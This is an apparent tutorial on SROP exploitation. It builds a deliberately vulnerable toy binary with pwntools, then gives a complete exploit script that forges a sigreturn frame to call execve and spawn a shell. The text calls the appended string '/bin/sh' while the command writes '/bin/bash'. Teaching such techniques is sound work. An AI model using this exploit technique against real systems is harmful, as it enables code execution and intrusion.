# Using SROP

## Source

As with the [syscalls](../../syscalls/exploitation-with-syscalls.md#the-source), I made the binary using the pwntools ELF features:

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF.from_assembly(
    '''
        mov rdi, 0;
        mov rsi, rsp;
        sub rsi, 8;
        mov rdx, 500;
        syscall;
        ret;
        
        pop rax;
        ret;
    ''', vma=0x41000
)
elf.save('vuln')
```

It's quite simple - a `read` syscall, followed by a `pop rax; ret` gadget. You can't control RDI/RSI/RDX, which you need to pop a shell, so you'll have to use SROP.

Once again, I added `/bin/sh` to the binary:

```bash
echo -en "/bin/bash\x00" >> vuln
```

## Exploitation

First let's plonk down the available gadgets and their location, as well as the location of `/bin/sh`.

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015
```

From here, I suggest you try the payload yourself. The padding \(as you can see in the assembly\) is `8` bytes until RIP, then you'll need to trigger a `sigreturn`, followed by the values of the registers.



The triggering of a `sigreturn` is easy - sigreturn is syscall `0xf` \(`15`\), so we just pop that into RAX and call `syscall`:

```python
payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
```

Now the syscall looks at the location of RSP for the register values; we'll have to fake them. They have to be in a specific order, but luckily for us pwntools has a cool feature called a `SigreturnFrame()` that handles the order for us.

```text
frame = SigreturnFrame()
```

Now we just need to decide what the register values should be. We want to trigger an `execve()` syscall, so we'll set the registers to the values we need for that:

```python
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
```

However, in order to trigger this we **also have to control RIP** and point it back at the `syscall` gadget, so the execve actually executes:

```python
frame.rip = SYSCALL_RET
```

We then append it to the payload and send.

```python
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

![Nailed it!](../../../../.gitbook/assets/image%20%2835%29.png)

### Final Exploit

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```



